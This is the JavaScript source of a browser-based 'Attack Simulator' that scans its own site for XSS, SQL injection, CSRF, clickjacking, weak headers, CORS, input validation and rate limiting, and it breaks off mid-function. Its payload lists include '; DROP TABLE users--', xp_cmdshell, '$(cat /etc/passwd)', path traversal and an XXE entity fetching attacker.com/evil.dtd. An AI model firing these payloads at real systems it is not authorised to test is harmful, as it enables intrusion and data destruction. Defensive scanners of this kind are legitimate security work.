/**
 * CipherTools Attack Simulator
 * Authorized Self-Attack Security Testing Engine
 *
 * DISCLAIMER: This tool is designed exclusively for authorized penetration
 * testing of your own website infrastructure. It only targets the current
 * origin (same-origin policy enforced). Unauthorized use of this tool
 * against systems you do not own or have explicit permission to test is
 * illegal and unethical. The authors assume no liability for misuse.
 *
 * Derived from CipherBaseAI SecurityMonitor threat signatures and
 * Cipher Browser attack-engine.js payload database.
 *
 * Zero external dependencies - vanilla JavaScript only.
 */

class AttackSimulator {
    constructor(options = {}) {
        this.origin = window.location.origin;
        this.results = [];
        this.isRunning = false;
        this.aborted = false;
        this.onProgress = options.onProgress || null;
        this.onComplete = options.onComplete || null;
        this.startTime = null;
        this.testsToRun = [
            'testXSS',
            'testSQLInjection',
            'testCSRF',
            'testClickjacking',
            'testHeaderSecurity',
            'testCORS',
            'testInputValidation',
            'testRateLimiting'
        ];
    }

    // ----------------------------------------------------------------
    // Utility helpers
    // ----------------------------------------------------------------

    _timestamp() {
        return new Date().toISOString();
    }

    _result(name, status, details) {
        return { name, status, details, timestamp: this._timestamp() };
    }

    _emit(message, type) {
        if (typeof this.onProgress === 'function') {
            this.onProgress({ message, type, timestamp: this._timestamp() });
        }
    }

    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Safely collect all visible input elements and forms on the page.
     */
    _collectInputs() {
        try {
            return Array.from(document.querySelectorAll(
                'input:not([type="hidden"]), textarea, select'
            ));
        } catch (_) {
            return [];
        }
    }

    _collectForms() {
        try {
            return Array.from(document.querySelectorAll('form'));
        } catch (_) {
            return [];
        }
    }

    // ----------------------------------------------------------------
    // 1. XSS Testing
    // ----------------------------------------------------------------

    async testXSS() {
        this._emit('Starting XSS vulnerability scan...', 'info');
        const subResults = [];

        // --- Reflected XSS payloads ---
        const xssPayloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            'javascript:alert(1)',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<details open ontoggle=alert(1)>',
            '<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'
        ];

        // Test 1: Check if inputs accept and reflect XSS payloads
        this._emit('  Testing form inputs for reflected XSS...', 'detail');
        const inputs = this._collectInputs();
        let inputVulnCount = 0;

        for (const input of inputs) {
            for (const payload of xssPayloads.slice(0, 3)) {
                try {
                    const originalValue = input.value;
                    input.value = payload;
                    // Check if the DOM reflects the payload unescaped
                    if (input.value === payload && !input.hasAttribute('data-sanitized')) {
                        inputVulnCount++;
                    }
                    input.value = originalValue;
                } catch (_) {
                    // Input may be read-only
                }
            }
        }

        if (inputVulnCount > 0) {
            subResults.push(this._result(
                'XSS - Input Acceptance',
                'warn',
                inputVulnCount + ' input(s) accepted raw XSS payloads without visible sanitization.'
            ));
        } else if (inputs.length === 0) {
            subResults.push(this._result(
                'XSS - Input Acceptance',
                'pass',
                'No input elements found on the current page to test.'
            ));
        } else {
            subResults.push(this._result(
                'XSS - Input Acceptance',
                'pass',
                'All inputs appear to handle XSS payloads safely.'
            ));
        }

        // Test 2: Check Content-Security-Policy for script-src
        this._emit('  Checking CSP for XSS mitigation...', 'detail');
        try {
            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
            const csp = response.headers.get('Content-Security-Policy') || '';
            const hasScriptSrc = /script-src\s/.test(csp);
            const allowsUnsafeInline = /('unsafe-inline'|"unsafe-inline")/.test(csp);
            const allowsUnsafeEval = /('unsafe-eval'|"unsafe-eval")/.test(csp);

            if (!csp) {
                subResults.push(this._result(
                    'XSS - CSP script-src',
                    'fail',
                    'No Content-Security-Policy header found. XSS attacks are not mitigated by CSP.'
                ));
            } else if (!hasScriptSrc) {
                subResults.push(this._result(
                    'XSS - CSP script-src',
                    'warn',
                    'CSP exists but does not include a script-src directive.'
                ));
            } else if (allowsUnsafeInline || allowsUnsafeEval) {
                subResults.push(this._result(
                    'XSS - CSP script-src',
                    'warn',
                    'CSP script-src includes unsafe-inline or unsafe-eval which weakens XSS protection.'
                ));
            } else {
                subResults.push(this._result(
                    'XSS - CSP script-src',
                    'pass',
                    'CSP script-src is configured and does not allow unsafe-inline/eval.'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'XSS - CSP script-src',
                'warn',
                'Could not fetch headers to check CSP. CORS or network issue.'
            ));
        }

        // Test 3: DOM-based XSS checks
        this._emit('  Scanning for DOM-based XSS sinks...', 'detail');
        const domSinks = [];
        const scripts = document.querySelectorAll('script:not([src])');
        const dangerousPatterns = [
            /\.innerHTML\s*=/,
            /\.outerHTML\s*=/,
            /document\.write\s*\(/,
            /document\.writeln\s*\(/,
            /eval\s*\(/,
            /setTimeout\s*\(\s*['"`]/,
            /setInterval\s*\(\s*['"`]/,
            /\.insertAdjacentHTML\s*\(/
        ];

        scripts.forEach(function(script) {
            var content = script.textContent || '';
            dangerousPatterns.forEach(function(pattern) {
                if (pattern.test(content)) {
                    domSinks.push(pattern.source);
                }
            });
        });

        if (domSinks.length > 0) {
            subResults.push(this._result(
                'XSS - DOM Sinks',
                'warn',
                'Found potential DOM-based XSS sinks in inline scripts: ' + [...new Set(domSinks)].join(', ')
            ));
        } else {
            subResults.push(this._result(
                'XSS - DOM Sinks',
                'pass',
                'No dangerous DOM sinks (innerHTML, eval, document.write) found in inline scripts.'
            ));
        }

        // Test 4: Check URL parameters for reflection
        this._emit('  Checking URL parameter reflection...', 'detail');
        const urlParams = new URLSearchParams(window.location.search);
        let reflected = false;
        const pageHtml = document.documentElement.innerHTML;
        urlParams.forEach(function(value) {
            if (value.length > 2 && pageHtml.includes(value)) {
                reflected = true;
            }
        });

        if (reflected) {
            subResults.push(this._result(
                'XSS - URL Reflection',
                'warn',
                'URL parameters appear to be reflected in the page HTML without encoding.'
            ));
        } else {
            subResults.push(this._result(
                'XSS - URL Reflection',
                'pass',
                'No URL parameter reflection detected in page content.'
            ));
        }

        this._emit('  XSS scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 2. SQL Injection Testing
    // ----------------------------------------------------------------

    async testSQLInjection() {
        this._emit('Starting SQL Injection scan...', 'info');
        const subResults = [];

        const sqliPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "1' UNION SELECT NULL--",
            "admin'--",
            "' OR 1=1--",
            "1; DELETE FROM users",
            "' AND '1'='1",
            "1' ORDER BY 1--",
            "' UNION ALL SELECT NULL,NULL--",
            "'; EXEC xp_cmdshell('dir')--"
        ];

        const noSqlPayloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{$where: "function() { return true; }"}',
            '{"$regex": ".*"}'
        ];

        // Test 1: Submit SQL payloads to form inputs and observe behavior
        this._emit('  Testing form inputs with SQL injection payloads...', 'detail');
        const forms = this._collectForms();
        let formTestCount = 0;
        let suspiciousResponses = 0;

        for (const form of forms) {
            const actionUrl = form.action || window.location.href;

            // Verify same-origin only
            try {
                const formOrigin = new URL(actionUrl, window.location.origin).origin;
                if (formOrigin !== this.origin) continue;
            } catch (_) {
                continue;
            }

            const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], input:not([type]), textarea');
            for (const input of inputs) {
                for (const payload of sqliPayloads.slice(0, 3)) {
                    formTestCount++;
                    try {
                        const testUrl = new URL(actionUrl, window.location.origin);
                        testUrl.searchParams.set(input.name || 'q', payload);

                        const response = await fetch(testUrl.toString(), {
                            method: 'GET',
                            headers: { 'X-Security-Test': 'CipherTools-AttackSimulator' },
                            signal: AbortSignal.timeout(5000)
                        });

                        const text = await response.text();
                        // Check for SQL error messages in response
                        const sqlErrorPatterns = [
                            /sql syntax/i,
                            /mysql_/i,
                            /ORA-\d{5}/,
                            /PostgreSQL/i,
                            /SQLite3?::/i,
                            /microsoft sql/i,
                            /unclosed quotation mark/i,
                            /ODBC\s+SQL/i,
                            /syntax error at or near/i
                        ];

                        for (const pattern of sqlErrorPatterns) {
                            if (pattern.test(text)) {
                                suspiciousResponses++;
                                break;
                            }
                        }
                    } catch (_) {
                        // Request failed or timed out - acceptable
                    }
                }
            }
        }

        if (suspiciousResponses > 0) {
            subResults.push(this._result(
                'SQL Injection - Error Disclosure',
                'fail',
                suspiciousResponses + ' response(s) contained SQL error messages when tested with injection payloads.'
            ));
        } else if (formTestCount === 0) {
            subResults.push(this._result(
                'SQL Injection - Form Testing',
                'pass',
                'No testable forms with text inputs found on the current page.'
            ));
        } else {
            subResults.push(this._result(
                'SQL Injection - Form Testing',
                'pass',
                'Tested ' + formTestCount + ' input combinations. No SQL error messages leaked in responses.'
            ));
        }

        // Test 2: Check for parameterized query indicators
        this._emit('  Checking for NoSQL injection patterns...', 'detail');
        const inputs = this._collectInputs();
        let acceptsJson = 0;
        for (const input of inputs) {
            for (const payload of noSqlPayloads) {
                try {
                    const orig = input.value;
                    input.value = payload;
                    if (input.value === payload) acceptsJson++;
                    input.value = orig;
                } catch (_) { /* read-only */ }
            }
        }

        if (acceptsJson > 0) {
            subResults.push(this._result(
                'SQL Injection - NoSQL Patterns',
                'warn',
                acceptsJson + ' input(s) accepted NoSQL injection payloads. Ensure server-side validation.'
            ));
        } else {
            subResults.push(this._result(
                'SQL Injection - NoSQL Patterns',
                'pass',
                'Inputs do not appear vulnerable to NoSQL injection payloads.'
            ));
        }

        this._emit('  SQL Injection scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 3. CSRF Testing
    // ----------------------------------------------------------------

    async testCSRF() {
        this._emit('Starting CSRF protection scan...', 'info');
        const subResults = [];
        const forms = this._collectForms();

        // Test 1: Check forms for anti-CSRF tokens
        this._emit('  Checking forms for CSRF tokens...', 'detail');
        let formsChecked = 0;
        let formsWithoutToken = 0;
        const csrfFieldNames = [
            'csrf', 'csrf_token', '_csrf', 'csrfmiddlewaretoken',
            'authenticity_token', '_token', 'token', 'nonce',
            '__RequestVerificationToken', 'antiforgery'
        ];

        for (const form of forms) {
            if (form.method && form.method.toUpperCase() === 'GET') continue;
            formsChecked++;
            const hiddenInputs = form.querySelectorAll('input[type="hidden"]');
            let hasToken = false;

            hiddenInputs.forEach(function(input) {
                const name = (input.name || '').toLowerCase();
                for (const csrfName of csrfFieldNames) {
                    if (name.includes(csrfName)) {
                        hasToken = true;
                    }
                }
            });

            // Also check meta tags for CSRF tokens
            const metaCsrf = document.querySelector('meta[name="csrf-token"], meta[name="_csrf"], meta[name="csrf"]');
            if (metaCsrf) hasToken = true;

            if (!hasToken) formsWithoutToken++;
        }

        if (formsChecked === 0) {
            subResults.push(this._result(
                'CSRF - Token Presence',
                'pass',
                'No POST forms found on the current page.'
            ));
        } else if (formsWithoutToken > 0) {
            subResults.push(this._result(
                'CSRF - Token Presence',
                'fail',
                formsWithoutToken + ' of ' + formsChecked + ' POST form(s) lack a CSRF token.'
            ));
        } else {
            subResults.push(this._result(
                'CSRF - Token Presence',
                'pass',
                'All ' + formsChecked + ' POST form(s) contain CSRF tokens.'
            ));
        }

        // Test 2: Check SameSite cookie attribute
        this._emit('  Checking cookie SameSite attributes...', 'detail');
        const cookies = document.cookie;
        if (cookies && cookies.length > 0) {
            subResults.push(this._result(
                'CSRF - Cookie SameSite',
                'warn',
                'Cookies are present. Verify SameSite=Strict or SameSite=Lax is set on session cookies (cannot be checked from JavaScript).'
            ));
        } else {
            subResults.push(this._result(
                'CSRF - Cookie SameSite',
                'pass',
                'No cookies accessible from JavaScript (they may have HttpOnly flag, which is good).'
            ));
        }

        // Test 3: Check for custom headers requirement (double submit)
        this._emit('  Testing for custom header CSRF protection...', 'detail');
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Security-Test': 'CipherTools-AttackSimulator'
                },
                body: 'test=csrf_check',
                signal: AbortSignal.timeout(5000)
            });

            if (response.status === 403 || response.status === 401) {
                subResults.push(this._result(
                    'CSRF - Server Enforcement',
                    'pass',
                    'Server returned ' + response.status + ' for POST without valid CSRF token. Protection appears active.'
                ));
            } else {
                subResults.push(this._result(
                    'CSRF - Server Enforcement',
                    'warn',
                    'Server returned ' + response.status + ' for POST without CSRF. Verify server-side enforcement.'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'CSRF - Server Enforcement',
                'warn',
                'Could not verify server-side CSRF enforcement (request failed).'
            ));
        }

        this._emit('  CSRF scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 4. Clickjacking Testing
    // ----------------------------------------------------------------

    async testClickjacking() {
        this._emit('Starting Clickjacking protection scan...', 'info');
        const subResults = [];

        // Test 1: X-Frame-Options header
        this._emit('  Checking X-Frame-Options header...', 'detail');
        try {
            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
            const xfo = response.headers.get('X-Frame-Options');

            if (!xfo) {
                subResults.push(this._result(
                    'Clickjacking - X-Frame-Options',
                    'fail',
                    'X-Frame-Options header is missing. Page can be framed by any origin.'
                ));
            } else if (/^(DENY|SAMEORIGIN)$/i.test(xfo.trim())) {
                subResults.push(this._result(
                    'Clickjacking - X-Frame-Options',
                    'pass',
                    'X-Frame-Options is set to "' + xfo.trim() + '".'
                ));
            } else {
                subResults.push(this._result(
                    'Clickjacking - X-Frame-Options',
                    'warn',
                    'X-Frame-Options value "' + xfo.trim() + '" may not provide full protection.'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'Clickjacking - X-Frame-Options',
                'warn',
                'Could not read X-Frame-Options header (CORS restriction).'
            ));
        }

        // Test 2: CSP frame-ancestors
        this._emit('  Checking CSP frame-ancestors directive...', 'detail');
        try {
            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
            const csp = response.headers.get('Content-Security-Policy') || '';

            if (/frame-ancestors\s+'none'/i.test(csp)) {
                subResults.push(this._result(
                    'Clickjacking - CSP frame-ancestors',
                    'pass',
                    "CSP frame-ancestors is set to 'none'. Page cannot be framed."
                ));
            } else if (/frame-ancestors\s+'self'/i.test(csp)) {
                subResults.push(this._result(
                    'Clickjacking - CSP frame-ancestors',
                    'pass',
                    "CSP frame-ancestors is set to 'self'. Only same-origin framing allowed."
                ));
            } else if (/frame-ancestors/.test(csp)) {
                subResults.push(this._result(
                    'Clickjacking - CSP frame-ancestors',
                    'warn',
                    'CSP frame-ancestors is set but may allow external origins.'
                ));
            } else {
                subResults.push(this._result(
                    'Clickjacking - CSP frame-ancestors',
                    'fail',
                    'CSP does not include frame-ancestors directive.'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'Clickjacking - CSP frame-ancestors',
                'warn',
                'Could not read CSP header to check frame-ancestors.'
            ));
        }

        // Test 3: Frame-busting JavaScript detection
        this._emit('  Checking for frame-busting scripts...', 'detail');
        const scripts = document.querySelectorAll('script:not([src])');
        let hasFrameBuster = false;
        scripts.forEach(function(script) {
            var content = script.textContent || '';
            if (/top\s*!==?\s*self/i.test(content) ||
                /top\.location/i.test(content) ||
                /window\.top/i.test(content) ||
                /parent\.frames/i.test(content)) {
                hasFrameBuster = true;
            }
        });

        if (hasFrameBuster) {
            subResults.push(this._result(
                'Clickjacking - Frame Busting',
                'pass',
                'Frame-busting JavaScript detected as additional protection layer.'
            ));
        } else {
            subResults.push(this._result(
                'Clickjacking - Frame Busting',
                'warn',
                'No frame-busting JavaScript detected. Rely on X-Frame-Options and CSP instead.'
            ));
        }

        this._emit('  Clickjacking scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 5. Security Headers Testing
    // ----------------------------------------------------------------

    async testHeaderSecurity() {
        this._emit('Starting Security Headers scan...', 'info');
        const subResults = [];

        const headerChecks = [
            {
                name: 'Strict-Transport-Security',
                header: 'Strict-Transport-Security',
                check: function(value) {
                    if (!value) return { status: 'fail', detail: 'HSTS header is missing. Site can be accessed over HTTP.' };
                    var maxAge = value.match(/max-age=(\d+)/);
                    if (maxAge && parseInt(maxAge[1]) >= 31536000) {
                        var hasSub = /includeSubDomains/i.test(value);
                        var hasPreload = /preload/i.test(value);
                        return {
                            status: 'pass',
                            detail: 'HSTS is set with max-age=' + maxAge[1] +
                                (hasSub ? ', includeSubDomains' : '') +
                                (hasPreload ? ', preload' : '') + '.'
                        };
                    }
                    return { status: 'warn', detail: 'HSTS max-age is less than 1 year (' + (maxAge ? maxAge[1] : 'unknown') + 's).' };
                }
            },
            {
                name: 'Content-Security-Policy',
                header: 'Content-Security-Policy',
                check: function(value) {
                    if (!value) return { status: 'fail', detail: 'CSP header is missing entirely.' };
                    var directives = value.split(';').length;
                    var hasDefault = /default-src/.test(value);
                    return {
                        status: hasDefault ? 'pass' : 'warn',
                        detail: 'CSP has ' + directives + ' directive(s).' +
                            (hasDefault ? ' default-src is defined.' : ' WARNING: No default-src directive.')
                    };
                }
            },
            {
                name: 'X-Content-Type-Options',
                header: 'X-Content-Type-Options',
                check: function(value) {
                    if (!value) return { status: 'fail', detail: 'X-Content-Type-Options header is missing. MIME-type sniffing is possible.' };
                    return value.toLowerCase().trim() === 'nosniff'
                        ? { status: 'pass', detail: 'X-Content-Type-Options is set to "nosniff".' }
                        : { status: 'warn', detail: 'X-Content-Type-Options has unexpected value: "' + value + '".' };
                }
            },
            {
                name: 'X-Frame-Options',
                header: 'X-Frame-Options',
                check: function(value) {
                    if (!value) return { status: 'fail', detail: 'X-Frame-Options is missing.' };
                    return /^(DENY|SAMEORIGIN)$/i.test(value.trim())
                        ? { status: 'pass', detail: 'X-Frame-Options is "' + value.trim() + '".' }
                        : { status: 'warn', detail: 'X-Frame-Options has value "' + value.trim() + '".' };
                }
            },
            {
                name: 'Referrer-Policy',
                header: 'Referrer-Policy',
                check: function(value) {
                    if (!value) return { status: 'warn', detail: 'Referrer-Policy header is missing. Browser defaults will apply.' };
                    var safe = ['no-referrer', 'strict-origin', 'strict-origin-when-cross-origin', 'same-origin', 'no-referrer-when-downgrade'];
                    return safe.includes(value.trim().toLowerCase())
                        ? { status: 'pass', detail: 'Referrer-Policy is "' + value.trim() + '".' }
                        : { status: 'warn', detail: 'Referrer-Policy "' + value.trim() + '" may leak referrer information.' };
                }
            },
            {
                name: 'Permissions-Policy',
                header: 'Permissions-Policy',
                check: function(value) {
                    if (!value) return { status: 'warn', detail: 'Permissions-Policy header is missing. Browser features are unrestricted.' };
                    return { status: 'pass', detail: 'Permissions-Policy is configured: ' + value.substring(0, 100) + (value.length > 100 ? '...' : '') };
                }
            },
            {
                name: 'X-XSS-Protection',
                header: 'X-XSS-Protection',
                check: function(value) {
                    if (!value) return { status: 'warn', detail: 'X-XSS-Protection header is absent (deprecated but still useful for older browsers).' };
                    return /1;\s*mode=block/i.test(value)
                        ? { status: 'pass', detail: 'X-XSS-Protection is "' + value.trim() + '".' }
                        : { status: 'warn', detail: 'X-XSS-Protection value "' + value.trim() + '" may not block attacks.' };
                }
            },
            {
                name: 'Cache-Control',
                header: 'Cache-Control',
                check: function(value) {
                    if (!value) return { status: 'warn', detail: 'Cache-Control header is missing. Sensitive pages may be cached.' };
                    return /no-store/i.test(value)
                        ? { status: 'pass', detail: 'Cache-Control includes no-store: "' + value.trim() + '".' }
                        : { status: 'warn', detail: 'Cache-Control is "' + value.trim() + '". Consider no-store for sensitive pages.' };
                }
            }
        ];

        try {
            this._emit('  Fetching response headers...', 'detail');
            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });

            for (const check of headerChecks) {
                this._emit('  Checking ' + check.name + '...', 'detail');
                const value = response.headers.get(check.header);
                const result = check.check(value);
                subResults.push(this._result(
                    'Header - ' + check.name,
                    result.status,
                    result.detail
                ));
            }

            // Check for information leakage headers
            this._emit('  Checking for information disclosure headers...', 'detail');
            const leakHeaders = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version'];
            for (const hdr of leakHeaders) {
                const val = response.headers.get(hdr);
                if (val) {
                    subResults.push(this._result(
                        'Header - ' + hdr + ' Disclosure',
                        'warn',
                        hdr + ' header exposes: "' + val + '". Consider removing to reduce fingerprinting.'
                    ));
                }
            }
        } catch (_) {
            subResults.push(this._result(
                'Header Security',
                'warn',
                'Could not fetch response headers. Same-origin or CORS restriction.'
            ));
        }

        this._emit('  Security Headers scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 6. CORS Testing
    // ----------------------------------------------------------------

    async testCORS() {
        this._emit('Starting CORS configuration scan...', 'info');
        const subResults = [];

        // Test 1: Check Access-Control-Allow-Origin
        this._emit('  Testing CORS response headers...', 'detail');
        try {
            const response = await fetch(window.location.href, {
                method: 'HEAD',
                cache: 'no-store'
            });

            const acao = response.headers.get('Access-Control-Allow-Origin');
            const acac = response.headers.get('Access-Control-Allow-Credentials');

            if (!acao) {
                subResults.push(this._result(
                    'CORS - Allow-Origin',
                    'pass',
                    'No Access-Control-Allow-Origin header set. Cross-origin requests are blocked by default.'
                ));
            } else if (acao === '*') {
                if (acac && acac.toLowerCase() === 'true') {
                    subResults.push(this._result(
                        'CORS - Wildcard with Credentials',
                        'fail',
                        'CRITICAL: Access-Control-Allow-Origin is "*" WITH credentials. This is a severe misconfiguration.'
                    ));
                } else {
                    subResults.push(this._result(
                        'CORS - Allow-Origin',
                        'warn',
                        'Access-Control-Allow-Origin is "*". Any origin can read responses. Restrict to specific origins if possible.'
                    ));
                }
            } else {
                subResults.push(this._result(
                    'CORS - Allow-Origin',
                    'pass',
                    'Access-Control-Allow-Origin is restricted to: "' + acao + '".'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'CORS - Allow-Origin',
                'warn',
                'Could not check CORS headers (request failed).'
            ));
        }

        // Test 2: Preflight request simulation
        this._emit('  Testing CORS preflight behavior...', 'detail');
        try {
            const response = await fetch(window.location.href, {
                method: 'OPTIONS',
                headers: {
                    'Origin': 'https://evil-attacker-site.example.com',
                    'Access-Control-Request-Method': 'POST',
                    'Access-Control-Request-Headers': 'X-Custom-Header'
                },
                signal: AbortSignal.timeout(5000)
            });

            const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
            if (allowOrigin === 'https://evil-attacker-site.example.com' || allowOrigin === '*') {
                subResults.push(this._result(
                    'CORS - Preflight Reflection',
                    'fail',
                    'Server reflects arbitrary origins in CORS preflight. Any origin can make cross-origin requests.'
                ));
            } else {
                subResults.push(this._result(
                    'CORS - Preflight',
                    'pass',
                    'Preflight response does not reflect arbitrary origins.'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'CORS - Preflight',
                'pass',
                'OPTIONS request was rejected or timed out (default secure behavior).'
            ));
        }

        this._emit('  CORS scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 7. Input Validation Testing
    // ----------------------------------------------------------------

    async testInputValidation() {
        this._emit('Starting Input Validation scan...', 'info');
        const subResults = [];

        const payloadGroups = {
            'Command Injection': [
                '; ls -la',
                '| whoami',
                '`id`',
                '$(cat /etc/passwd)',
                '& dir',
                '; cat /etc/passwd'
            ],
            'Path Traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '....//....//etc/passwd'
            ],
            'LDAP Injection': [
                '*)(uid=*))(|(uid=*',
                '*()|&\'',
                'admin)(&)'
            ],
            'XXE Injection': [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                '<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">'
            ],
            'Prototype Pollution': [
                '__proto__',
                'constructor[prototype]',
                '{"__proto__": {"admin": true}}'
            ],
            'Log Injection': [
                '\r\nAdmin logged in successfully',
                '%0d%0aFake-Header: injected'
            ],
            'Template Injection': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '#{7*7}'
            ]
        };

        const inputs = this._collectInputs();

        if (inputs.length === 0) {
            subResults.push(this._result(
                'Input Validation',
                'pass',
                'No input elements found on the current page.'
            ));
            this._emit('  Input Validation scan complete.', 'success');
            return subResults;
        }

        for (const [category, payloads] of Object.entries(payloadGroups)) {
            this._emit('  Testing ' + category + ' payloads...', 'detail');
            let accepted = 0;
            let tested = 0;

            for (const input of inputs) {
                if (input.type === 'number' || input.type === 'date' || input.type === 'color' ||
                    input.type === 'range' || input.type === 'checkbox' || input.type === 'radio' ||
                    input.type === 'file' || input.type === 'submit' || input.type === 'button') {
                    continue;
                }
                for (const payload of payloads) {
                    tested++;
                    try {
                        const orig = input.value;
                        input.value = payload;
                        if (input.value === payload) accepted++;
                        input.value = orig;
                    } catch (_) { /* read-only */ }
                }
            }

            if (tested === 0) continue;

            const acceptRate = (accepted / tested * 100).toFixed(0);
            if (accepted > 0 && parseInt(acceptRate) > 50) {
                subResults.push(this._result(
                    'Input Validation - ' + category,
                    'warn',
                    acceptRate + '% of inputs accepted ' + category + ' payloads. Implement server-side validation.'
                ));
            } else {
                subResults.push(this._result(
                    'Input Validation - ' + category,
                    'pass',
                    category + ' payloads handled appropriately by input elements.'
                ));
            }
        }

        // Check for HTML5 validation attributes
        this._emit('  Checking for HTML5 validation attributes...', 'detail');
        let hasPattern = 0;
        let hasRequired = 0;
        let hasMaxLength = 0;
        let totalInputs = inputs.length;

        for (const input of inputs) {
            if (input.hasAttribute('pattern')) hasPattern++;
            if (input.hasAttribute('required')) hasRequired++;
            if (input.hasAttribute('maxlength')) hasMaxLength++;
        }

        subResults.push(this._result(
            'Input Validation - HTML5 Attributes',
            (hasPattern > 0 || hasRequired > 0) ? 'pass' : 'warn',
            'Of ' + totalInputs + ' inputs: ' + hasRequired + ' have required, ' +
            hasPattern + ' have pattern, ' + hasMaxLength + ' have maxlength. ' +
            (hasPattern === 0 && hasRequired === 0 ? 'Consider adding client-side validation.' : '')
        ));

        this._emit('  Input Validation scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // 8. Rate Limiting Testing
    // ----------------------------------------------------------------

    async testRateLimiting() {
        this._emit('Starting Rate Limiting scan...', 'info');
        const subResults = [];

        // Test: Send rapid requests and check for rate limiting
        this._emit('  Sending rapid requests to check rate limiting...', 'detail');
        const rapidCount = 20;
        const url = window.location.href;
        let successCount = 0;
        let rateLimited = false;
        let rateLimitStatus = null;
        const responseTimes = [];

        for (let i = 0; i < rapidCount; i++) {
            if (this.aborted) break;
            try {
                const start = performance.now();
                const response = await fetch(url + '?_rate_test=' + i + '&_t=' + Date.now(), {
                    method: 'GET',
                    headers: { 'X-Security-Test': 'CipherTools-RateLimiting' },
                    cache: 'no-store',
                    signal: AbortSignal.timeout(5000)
                });
                const elapsed = performance.now() - start;
                responseTimes.push(elapsed);

                if (response.status === 429 || response.status === 503) {
                    rateLimited = true;
                    rateLimitStatus = response.status;
                    break;
                }
                successCount++;
            } catch (_) {
                // Request failed - could be rate limiting
                rateLimited = true;
                break;
            }
        }

        if (rateLimited) {
            subResults.push(this._result(
                'Rate Limiting - Detection',
                'pass',
                'Rate limiting detected after ' + successCount + ' rapid requests. ' +
                (rateLimitStatus ? 'Server returned HTTP ' + rateLimitStatus + '.' : 'Connection was throttled.')
            ));
        } else {
            subResults.push(this._result(
                'Rate Limiting - Detection',
                'warn',
                'Sent ' + rapidCount + ' rapid requests without rate limiting. Consider implementing rate limiting.'
            ));
        }

        // Check for rate limiting headers
        this._emit('  Checking for rate limiting headers...', 'detail');
        try {
            const response = await fetch(url, { method: 'HEAD', cache: 'no-store' });
            const rateLimitHeaders = [
                'X-RateLimit-Limit',
                'X-RateLimit-Remaining',
                'X-RateLimit-Reset',
                'RateLimit-Limit',
                'RateLimit-Remaining',
                'RateLimit-Reset',
                'Retry-After'
            ];

            let foundHeaders = [];
            for (const hdr of rateLimitHeaders) {
                const val = response.headers.get(hdr);
                if (val) foundHeaders.push(hdr + ': ' + val);
            }

            if (foundHeaders.length > 0) {
                subResults.push(this._result(
                    'Rate Limiting - Headers',
                    'pass',
                    'Rate limiting headers found: ' + foundHeaders.join(', ')
                ));
            } else {
                subResults.push(this._result(
                    'Rate Limiting - Headers',
                    'warn',
                    'No rate limiting headers found in response.'
                ));
            }
        } catch (_) {
            subResults.push(this._result(
                'Rate Limiting - Headers',
                'warn',
                'Could not check rate limiting headers.'
            ));
        }

        // Response time analysis
        if (responseTimes.length >= 5) {
            const avgTime = responseTimes.reduce(function(a, b) { return a + b; }, 0) / responseTimes.length;
            const lastFive = responseTimes.slice(-5);
            const avgLast = lastFive.reduce(function(a, b) { return a + b; }, 0) / lastFive.length;
            const slowingDown = avgLast > avgTime * 1.5;

            if (slowingDown) {
                subResults.push(this._result(
                    'Rate Limiting - Throttling',
                    'pass',
                    'Response times increased under load (avg ' + avgTime.toFixed(0) + 'ms -> ' +
                    avgLast.toFixed(0) + 'ms). Server may be throttling.'
                ));
            } else {
                subResults.push(this._result(
                    'Rate Limiting - Throttling',
                    'warn',
                    'Response times remained consistent under rapid requests (avg ' + avgTime.toFixed(0) + 'ms).'
                ));
            }
        }

        this._emit('  Rate Limiting scan complete.', 'success');
        return subResults;
    }

    // ----------------------------------------------------------------
    // Run All Tests
    // ----------------------------------------------------------------

    async runAll(selectedTests) {
        this.isRunning = true;
        this.aborted = false;
        this.results = [];
        this.startTime = new Date();

        const tests = selectedTests || this.testsToRun;

        this._emit('=== CipherTools Security Scan Started ===', 'header');
        this._emit('Target: ' + this.origin, 'info');
        this._emit('Tests: ' + tests.length, 'info');
        this._emit('Time: ' + this.startTime.toLocaleString(), 'info');
        this._emit('', 'info');

        for (let i = 0; i < tests.length; i++) {
            if (this.aborted) {
                this._emit('Scan aborted by user.', 'error');
                break;
            }

